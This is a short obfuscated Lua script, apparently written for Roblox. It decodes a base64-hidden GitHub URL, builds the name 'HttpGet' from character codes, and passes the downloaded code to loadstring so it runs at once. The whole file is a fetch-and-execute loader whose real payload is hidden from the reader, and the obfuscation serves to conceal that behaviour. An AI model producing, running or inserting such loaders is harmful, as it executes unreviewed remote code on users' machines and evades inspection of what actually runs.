local a={"aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2xlbG8wMDAyL3BzdmIvcmVmcy9oZWFkcy9tYWluL3MxLmx1YQ=="}

local function b(c)
    return (c:gsub('.', function(d)
        local e,f='',d:byte()
        for g=8,1,-1 do
            e=e..(f%2^g-f%2^(g-1)>0 and '1' or '0')
        end
        return e
    end):gsub('%d%d%d?%d?%d?%d?', function(h)
        if #h ~= 6 then
            return ''
        end
        local i=0
        for j=1,6 do
            i=i + (h:sub(j,j)=='1' and 2^(6-j) or 0)
        end
        return ('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'):sub(i+1,i+1)
    end)..({ '', '==', '=' })[#c%3+1])
end

local function c(d)
    d = string.gsub(d, '[^'..'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='..']', '')
    return (d:gsub('.', function(e)
        if e == '=' then
            return ''
        end
        local f = ('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'):find(e)-1
        local g = ''
        for h=6,1,-1 do
            g = g .. (f%2^h-f%2^(h-1)>0 and '1' or '0')
        end
        return g
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(i)
        if #i ~= 8 then
            return ''
        end
        local j = 0
        for k=1,8 do
            j = j + (i:sub(k,k)=='1' and 2^(8-k) or 0)
        end
        return string.char(j)
    end))
end

local l = game[string.char(72,116,116,112,71,101,116)]
local m = loadstring

return m(l(game,c(a[1])))()
